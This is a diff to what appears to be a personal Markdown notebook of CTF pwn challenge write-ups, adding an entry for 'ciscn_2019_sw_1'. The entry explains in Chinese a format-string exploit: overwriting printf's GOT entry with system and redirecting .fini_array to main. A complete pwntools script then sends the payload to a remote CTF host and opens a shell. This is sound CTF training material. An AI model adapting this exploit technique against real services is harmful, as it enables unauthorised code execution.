@@ -713,8 +713,6 @@ icon: icon-html
 
 * ### [HarekazeCTF2019]baby_rop2
 
-  
-
 * ### ciscn_2019_final_2
 
   UAF、double free、tcache attack
@@ -835,7 +833,32 @@ icon: icon-html
   
   ```
 
-* 
+* ### ciscn_2019_sw_1
+
+  格式化字符串漏洞，把printf_got改为system_plt，getshell需要再跑一次main输入/bin/sh，所以把fini_array改成main
+
+  __libc_start_main()中调用.fini段前，.fini_array中的函数就已经入栈，把.fini_array改为main再main执行之后可以再执行一次main
+
+  ```python
+  from pwn import *
+  r = remote('node2.buuoj.cn.wetolink.com',28730)
+  #r = process('./ciscn_2019_sw_1')
+  elf = ELF('./ciscn_2019_sw_1')
+  
+  system_plt = elf.plt['system']
+  printf_got = elf.got['printf']
+  
+  main = 0x8048534
+  fini_array = 0x0804979c
+  #aaaa%4$x
+  offset = 4
+  payload = fmtstr_payload(offset,{fini_array:main,printf_got:system_plt},numbwritten=0, write_size='short')
+  log.info(len(payload))
+  print(payload)
+  r.sendline(payload)
+  r.sendline('/bin/sh\x00')
+  r.interactive()
+  ```
 
   
 
